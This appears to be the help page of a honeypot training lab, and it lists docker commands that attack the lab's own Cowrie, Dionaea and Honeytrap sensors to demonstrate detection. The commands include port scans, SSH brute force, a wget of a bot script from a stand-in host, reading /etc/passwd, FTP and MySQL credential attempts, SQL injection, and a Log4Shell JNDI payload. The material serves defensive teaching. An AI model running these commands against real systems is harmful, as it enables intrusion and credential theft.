Attack commands drive the platform, don't just poke the honeypots.

Each command launches a real attacker in a throwaway container on the lab network, so it needs nothing on your Mac but Docker, never stops at a password prompt, and is a single safe paste. Every attack is captured by a sensor, run through the detection rules, correlated into a graded case and mapped to MITRE — watch it happen on the pages named under each one.

Guided walkthrough one command, the whole story — best for a demo or viva

Runs all five stages below in order and narrates what to open at each step: recon → brute force → breach → service & web attacks → malware triage. It reads the result back out of the database at the end, so nothing on screen is a canned claim.

./scripts/demo.sh

Run it from the project folder. Add --fast to skip the pauses. First run builds the attacker image (needs internet once).

Or fire a single stage yourself:

1. Reconnaissance — port / service scanDionaea · MITRE T1046

One source touches many distinct service ports in seconds. The engine counts distinct ports (not packets) and raises st-recon-006 (MEDIUM).

docker run --rm --network honeynet_edge st-attacker:latest 'for p in 21 80 135 443 445 1433 3306 5060 27017; do nc -z -w1 honeynet_dionaea $p; done'

See: Event Log (a burst from one new IP) · MITRE ATT&CK (Discovery lights up).

2. Brute force, then a breachCowrie SSH · the full kill chain → CRITICAL

Five wrong passwords for root, then the one Cowrie accepts (hunter2), then hands-on-keyboard commands and a payload download. Fires st-auth-001 + st-cred-002 (CRITICAL) + st-exec-003 + st-exec-004, all correlated into one CRITICAL case.

docker run --rm --network honeynet_edge st-attacker:latest 'for pw in 123456 password root toor admin; do sshpass -p $pw ssh -p 2222 root@honeynet_cowrie true 2>/dev/null; done; sshpass -p hunter2 ssh -p 2222 root@honeynet_cowrie "whoami; id; uname -a; cat /etc/passwd; wget http://198.51.100.9/bot.sh; exit"'

See: Investigations (new CRITICAL case: timeline + the four rules under "why this severity") · Credential Vault (root / hunter2 + the 5 rejected) · Behaviour Profiling.

3. Service credential theftDionaea · FTP + MySQL

Captures credentials on services other than SSH — proof the vault is multi-protocol. Raises st-cred-003 (MEDIUM) per service.

docker run --rm --network honeynet_edge st-attacker:latest 'curl -s -m6 --user oracle:oracle123 ftp://honeynet_dionaea:21/ >/dev/null; mariadb -h honeynet_dionaea -u root -ptoor123 --ssl=0 --connect-timeout=6 -e "show databases" 2>/dev/null; echo done'

See: Credential Vault — FTP and MYSQL rows alongside SSH.

4. Web application attackHoneytrap · MITRE T1190

SQL-injection and Log4Shell (JNDI) payloads in the request and user agent. Raises st-web-002 (HIGH).

docker run --rm --network honeynet_edge st-attacker:latest 'curl -s -m5 "http://honeynet_honeytrap:8022/?id=1%27%20OR%20%271%27=%271" -A "sqlmap/1.7"; curl -s -m5 "http://honeynet_honeytrap:8022/" -A "jndi:ldap://198.51.100.9/a"; echo done'

See: Event Log (Honeytrap HTTP with the injection strings) · MITRE ATT&CK (Initial Access T1190).

5. Full sweep — all three sensors at oncesmoke test

One recon pass across every sensor. Quick confirmation the whole capture path is alive.

docker run --rm --network honeynet_edge st-attacker:latest 'for t in honeynet_cowrie:2222 honeynet_cowrie:2223 honeynet_dionaea:445 honeynet_dionaea:21 honeynet_dionaea:1433 honeynet_honeytrap:8022 honeynet_honeytrap:8023; do nc -z -w1 ${t%:*} ${t#*:} && echo up $t; done'

See: Event Log — a connect event on every sensor.

Prefer to attack from your Mac directly?no container

The stack also publishes every sensor on localhost, so you can attack from a normal Terminal. The container commands above are preferred for a demo (one paste, nothing to install, never hangs on a password), but a live SSH makes a nice "real attacker" moment:

ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null oracle@localhost

Password is oracle (Cowrie accepts it). Once in, type: whoami; id; cat /etc/passwd; wget http://198.51.100.9/x; exit. Run these as separate lines, not pasted with the comment text.
